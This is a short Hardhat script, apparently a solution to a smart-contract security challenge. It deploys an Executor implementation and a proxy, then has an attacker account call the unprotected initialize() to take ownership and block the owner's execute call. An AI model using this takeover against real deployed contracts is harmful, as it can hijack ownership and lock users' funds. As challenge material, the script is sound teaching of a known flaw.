const { ethers } = require("hardhat");
const hre = require("hardhat");

/*
    There is standard proxy pattern with delegatecall. But the owner want to execute arbitary code via execute method. 
    To complete this round you should broke Executor contract to make it impossible to call execute.
*/

async function main() {
    const [owner, attacker] = await hre.ethers.getSigners();

    const Executor = await hre.ethers.getContractFactory("Executor");
    const executor = await Executor.connect(owner).deploy();

    const Proxy = await hre.ethers.getContractFactory("Proxy");
    const proxy = await Proxy.connect(owner).deploy(executor.address);
 
    //change the owner to attacker
    await executor.connect(attacker).initialize();
    
    //cannot use execute method (owner changed)
    await executor.connect(owner).execute(proxy.address);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
